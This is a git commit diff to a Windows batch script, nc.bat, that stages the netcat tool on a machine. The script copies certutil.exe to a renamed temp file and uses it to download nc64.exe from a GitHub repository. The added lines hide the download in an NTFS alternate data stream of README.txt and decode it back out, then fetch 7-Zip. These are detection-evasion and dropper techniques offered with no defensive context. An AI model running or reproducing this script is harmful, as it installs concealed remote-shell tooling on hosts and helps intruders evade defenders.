9ebb50aa0a32657a41ce2125d8d88497c7330a55
inwestallis <inwestallis@gmail.com>
2020-02-29 13:53:09 +0300

    Update nc.bat

--- nc.bat
+++ nc.bat
@@ -2,7 +2,11 @@
 
 copy %windir%\system32\certutil.exe %temp%\cr.tmp
 
-%temp%\cr.tmp -urlcache -split -f https://github.com/inwestallis/first_repository/raw/master/nc64.exe %Temp%\nc64.exe
+%temp%\cr.tmp -urlcache -split -f https://github.com/inwestallis/first_repository/raw/master/nc64.exe %Temp%\nc.exe
+
+type %Temp%\nc.exe > c:\temp\README.txt:hid.txt
+%temp%\cr.tmp -decode c:\temp\README.txt:hid.txt %Temp%\nc64.exe
+
 
 %temp%\cr.tmp -urlcache -split -f https://github.com/daemondevin/7-ZipPortable/raw/master/App/7-Zip64/7z.exe %Temp%\7z.exe
 
